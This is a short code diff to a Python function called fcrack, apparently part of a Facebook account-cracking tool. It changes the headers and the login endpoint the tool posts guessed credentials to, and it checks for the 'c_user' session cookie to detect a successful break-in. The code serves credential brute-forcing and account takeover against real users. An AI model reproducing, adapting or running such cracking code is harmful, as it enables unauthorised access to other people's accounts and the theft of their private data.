@@ -837,7 +837,7 @@ def fcrack(uid,pwx,tl):
             'accept-language': 'en-US, en q-0.9',
 
 
-            'referer': 'https://free.facebook.com/zero/toggle/nux/?_rdc=1&_rdr',
+            
 
             'sec-ch-ua': '"Chromium"; v-"107", "Not-A7Brand"; v-"24"',
 
@@ -856,7 +856,7 @@ def fcrack(uid,pwx,tl):
             'upgrade-insecure-requests': '1', 
 
             'user-agent': ua}
-			lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://free.facebook.com/?hrc=1&_rdr',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
